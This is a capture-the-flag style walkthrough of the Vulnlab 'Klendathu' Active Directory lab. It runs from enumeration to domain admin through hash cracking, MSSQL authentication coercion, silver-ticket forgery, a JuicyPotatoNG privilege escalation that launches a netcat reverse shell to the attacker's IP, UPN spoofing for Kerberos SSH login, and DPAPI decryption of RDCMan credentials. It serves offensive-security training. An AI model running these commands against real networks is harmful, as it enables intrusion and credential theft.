
# Vulnlab - Klendathu

## DC1.KLENDATHU.VL

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-03 20:54:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: KLENDATHU.VL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?                
464/tcp  open  kpasswd5?                 
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped                       
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: KLENDATHU.VL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped            
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
```

## SRV1.KLENDATHU.VL

```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn          
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
| ssl-cert: Subject: commonName=SRV1.KLENDATHU.VL
```
## 10.10.175.71

```bash
PORT     STATE SERVICE VERSION       
22/tcp   open  ssh     OpenSSH 8.7 (protocol 2.0)
| ssh-hostkey:
|   256 d66045434fa19321bf1edcc36265e0e5 (ECDSA)
|_  256 1169f003859ff4ea1529d4c2655d27eb (ED25519)         
111/tcp  open  rpcbind 2-4 (RPC #100000)                
| rpcinfo:        
2049/tcp open 
```

We have smb port open on SRV1 and DC1, NFS on the linux hosts so let's start enumerating the shares first

<img src="https://i.imgur.com/O6oGnWd.png"/>

# Enumerating NFS share

We get access denied on both of them, looking at nfs, we have `/mnt/nfs_share` that can be mounted from our host

<img src="https://i.imgur.com/aBrtysm.png"/>

Mounting the folder with `mount`

```bash
sudo mount -t nfs 10.10.175.71:/mnt/nfs_shares /home/arz/Vulnlabs/Klendathu/shares
```

<img src="https://i.imgur.com/kJqDKxF.png"/>


There's a configuration file for a cisco switch, at the end there's a contact email which could be a domain user, which is a valid user

<img src="https://i.imgur.com/HlWVwUU.png"/>

<img src="https://i.imgur.com/uGuqgqI.png"/>

We can also see a cisco secret password which is a MD5 hashed password

<img src="https://i.imgur.com/Noacbpt.png"/>

This can be cracked with either hashcat or john

```bash
hashcat -a 0 -m 500 ./hash.txt /usr/share/wordlists/rockyou.txt  --force
```

<img src="https://i.imgur.com/svfnyqx.png"/>

With these credentials we can list down the shares on both windows hosts and can read `HomeDirs` on DC which is interesting

<img src="https://i.imgur.com/YX3uEec.png"/>

But these directories are not accessible with zim

<img src="https://i.imgur.com/mvgwvML.png"/>

Moving forward we can enumerate AD with bloodhound

```bash
python3 /opt/BloodHound.py/bloodhound.py -d 'KLENDATHU.VL' -u 'zim' -p 'password' -ns 10.10.189.69 -dc DC1.KLENDATHU.VL
```

<img src="https://i.imgur.com/B6xDdV1.png"/>

This user belongs to Netadmins group but there's nothing beyond that bloodhound show us 

<img src="https://i.imgur.com/6zXMOyR.png"/>
## Accessing MSSQL

We have MSSQL running on SRV1, so verifying these credentials can be used to login there

<img src="https://i.imgur.com/qfCyq77.png"/>

<img src="https://i.imgur.com/pxG4pEc.png"/>

Here we can try to enable `xp_cmdshell` , but it was not getting executed, similarly with `xp_dirtree` as well

<img src="https://i.imgur.com/jx4XIbF.png"/>
<img src="https://i.imgur.com/5wQpASR.png"/>s

## MSSQL Coerced Authentication

The reason behind this is probably that we are a guest user in the database,
Looking for any alternate functions that can allow us to query for UNC paths, there's a neat cheat sheet for coercion through mssql but most of them didn't work as they required administrative privileges or were blocked, `xp_fileexist` was working tho but it wasn't able to perform coercion just showing if the file exists

<img src="https://i.imgur.com/dUNL7v7.png"/>

Searching around for utilizing fileexists, there's another function `sys.dm_os_file_exist` which we can cause coercion, even tho the functionality is the same but I am uncertain what major difference is there between the two

<img src="https://i.imgur.com/0veZWBO.png"/>

```bash
SELECT * FROM sys.dm_os_file_exists('\\10.8.0.136\test\')
```

<img src="https://i.imgur.com/NdUOOWZ.png"/>
<img src="https://i.imgur.com/nea9MVy.png"/>

The mssql service is running as RASCZAK user so what if we try to create a silver ticket and then access the service, we can convert the plain text into nthash with python and get the domain sid with rpcclient (or any other way we want)

<img src="https://i.imgur.com/lHwslJ3.png"/>
<img src="https://i.imgur.com/wnhUxXT.png"/>

For forging a silver ticket, `ticketer.py` will be used to do that

```bash
ticketer.py -nthash hash -spn MSSQLSvc/SRV1.KLENDATHU.VL -domain KLENDATHU.VL -domain-sid S-1-5-21-641890747-1618203462-755025521 administrator
```

<img src="https://i.imgur.com/rsWH0bb.png"/>

After using the forged ticket (silver ticket), we can see that the user we currently are is `dbo` which is the database owner, so now we won't have any restrictions on running xp_cmdshell

<img src="https://i.imgur.com/Fvj5Cjz.png"/>

Now transferring netcat to get a shell

<img src="https://i.imgur.com/gokHSa6.png"/>
## Escalating to Local Admin

We can perform local privilege escalating by abusing `SeImpersonte` privilege through `JuicyPotato-NG`

<img src="https://i.imgur.com/8C8h86J.png"/>

```bash
JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:/Users/rasczak/nc.exe 10.8.0.136 2222 -e cmd.exe"
```

<img src="https://i.imgur.com/mR24sN1.png"/>

From here onwards there wasn't anything we could do as dumping lsass didn't returned any domain user's hash other than the local admin and machine account

<img src="https://i.imgur.com/V83FnRV.png"/>
## Spoofing domain users with GSSAPI

Going back to bloodhound, checking outbound control on RASCZAK , we have `GenericWrite`  and `ForeChangePassword` on two domain users, `rico` and `ibanez` , with this ACL we can change the password using `rpcclient` or `net rpc`

<img src="https://i.imgur.com/lsgnMGg.png"/>

<img src="https://i.imgur.com/KXZFTTZ.png"/>
These also doesn't have any ACLs on domain objects, the machine we have is linux (SRV2), using rico to logon to SRV2 didn't worked

<img src="https://i.imgur.com/o251y1l.png"/>

There's a research done by Ceri Coburn from Pen Test Partners, where linux servers joined to Active Directory have misconfiguration in the authentication mechanism where name-type, enterprise is used (NT_ENTERPRISE), if we have GenericWrite on a domain user, we can edit the `userPrincipalName` attribute, this attribute is utilized by `NT_ENTERPRISE` through which we can spoof domain users (this is explained quite well in the blog post). To abuse this we need to first identify the user that we'll spoof, there's a group named `LINUX_ADMINS` with two members

<img src="https://i.imgur.com/Rn1x7Q8.png"/>

Then adding `userPrincpalName` to be  any of the two users, for adding this attribute we can use `ldapmodify` for that we need to create a `ldif` file

```bash
dn: cn=rico,cn=users,dc=klendathu,dc=vl
changetype: modify
modify: userPrincipalName
userPrincipalName: flores
```

```bash
ldapmodify -H ldap://DC1.KLENDATHU.VL -a -x -D "CN=RASCZAK,CN=USERS,DC=KLENDATHU,DC=VL" -W -f ./modify_user.ldif
```

<img src="https://i.imgur.com/oEgllqE.png"/>

This attribute can be verified with `ldapsearch`

<img src="https://i.imgur.com/cIo3P2L.png"/>

Transfer Rubeus on SRV1 and get TGT for flores with `/princapltype:enterprise`

<img src="https://i.imgur.com/1PylaNO.png"/>

Make sure to have GSSAPI authentication in `/etc/ssh/sshd_config` and set the domain realm in `/etc/krb5.conf`

<img src="https://i.imgur.com/DY6i1nI.png"/>

<img src="https://i.imgur.com/d5s2yLM.png"/>

Convert the kirbi ticket to ccache and use it against ssh with `-K`

<img src="https://i.imgur.com/pFagwRV.png"/>

<img src="https://i.imgur.com/1Rl8BF6.png"/>

We can directly become root here as flores is a "linux admin", so just running `sudo bash` will give us the root shell

<img src="https://i.imgur.com/j7O6f53.png"/>

root user's directory has a backup of domain controller with `ntds.dit` , `SAM` and `SECURITY` file from the registry hive

<img src="https://i.imgur.com/cgHVyCR.png"/>

But the passwords here have been reset so there's no point and parse the ntds file, the `/tmp` directory has a ticket for `svc_backup` account

<img src="https://i.imgur.com/KiQ6fVy.png"/>

This can be used just by transferring on our kali machine and export the ticket

<img src="https://i.imgur.com/XOPfSzW.png"/>

svc_backup doesn't have any special ACL but the description does say about syncing data to user's directories

<img src="https://i.imgur.com/3dVyRrW.png"/>

So going back at the enumeration stage where we were trying to access smb shares, there were some user's directories, with this user those directories are accessible
<img src="https://i.imgur.com/yAAyLYF.png"/>

Here `jnkeins.rdg` , is a file containing configuration settings for connecting to remote desktop sessions, this is configuration is for administrator 

<img src="https://i.imgur.com/KysuFYo.png"/>

From chatgpt I generated a ps script to decrypt the password but it didn't worked due to how the password is encrypted

```powershell
Add-Type -AssemblyName System.Security
function Unprotect-RDCManPassword {
    param (
        [Parameter(Mandatory=$true)]
        [string]$encryptedString
    )

    try {
        # Convert the base64 string to a byte array
        $bytes = [Convert]::FromBase64String($encryptedString)

        # Decrypt the byte array using DPAPI
        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

        # Convert the decrypted byte array back to a string
        $decryptedString = [System.Text.Encoding]::Unicode.GetString($decryptedBytes)

        return $decryptedString
    } catch {
        Write-Error "Failed to decrypt password: $_"
    }
}

$encryptedPassword = "AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAABS0Gmx4U2k+bLUYfRpOl6wAAAAACAAAAAAADZgAAwAAAABAAAAAqvWFuXTLeCWvFNnkKjNDcAAAAAASAAACgAAAAEAAAAHHnv4NI9rTi06sCfSEy5hsoAAAAtCdIUjQfzQiJj363pO1RW/XSIlS/pMf/DBn3EHb8xEha6u1f/CMguhQAAACVsld41QgTZXMtLDfgrswQaShAxQ=="
$decryptedPassword = Unprotect-RDCManPassword -encryptedString $encryptedPassword

Write-Output "Decrypted Password: $decryptedPassword"
```

<img src="https://i.imgur.com/LCvjEqG.png"/>

So again taking a step back in jenkins's home directory, there was `AppData_Roaming_Backup.zip` , after extracting the archive, the path to master keys is in `./AppData/Roaming/Microsoft/Protect`

<img src="https://i.imgur.com/TVyaBED.png"/>

Using `ntdissector` , domain backup keys can be extracted, there will be a file named `secrets.json` contaning pvk value encoded in base64

<img src="https://i.imgur.com/tFWZhFl.png"/>

<img src="https://i.imgur.com/mEHC7LF.png"/>

<img src="https://i.imgur.com/sizvLqd.png"/>

We'll need this private key along with the path where the master keys are located and the SID of jenkins user (which can retrieved either by rpcclient, lookupsid), I'll grab the SID from bloodhound

<img src="https://i.imgur.com/fccBQKx.png"/>

From `DIANA Windows Credential Toolkit` , there's a script `diana-msrdcmandec.py` for decrpyting rdcman credentials, we have all the parameters for decrypting the password from rdg file

```bash
python3 ./script.py ./jenkins.rdg --masterkey /home/arz/Vulnlabs/Klendathu/AppData/Roaming/Microsoft/Protect/S-1-5-21-641890747-1618203462-755025521-1110 --sid S-1-5-21-641890747-1618203462-755025521-1110 -k ./key.pvk
```

<img src="https://i.imgur.com/nqC61Vd.png"/>

Having administrator's password, we can just login through WinRM and get full access on the domain

<img src="https://i.imgur.com/OOPbIgc.png"/>

# References

- https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e
- https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-v
- https://www.ibm.com/docs/en/aix/7.1?topic=support-using-openssh-kerberos
- https://www.winter.fyi/2017/01/decrypt-password-remote-desktop-connection-manager-rdcman/
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-dpapi/#dpapi-localmachine-context
- https://github.com/synacktiv/ntdissector
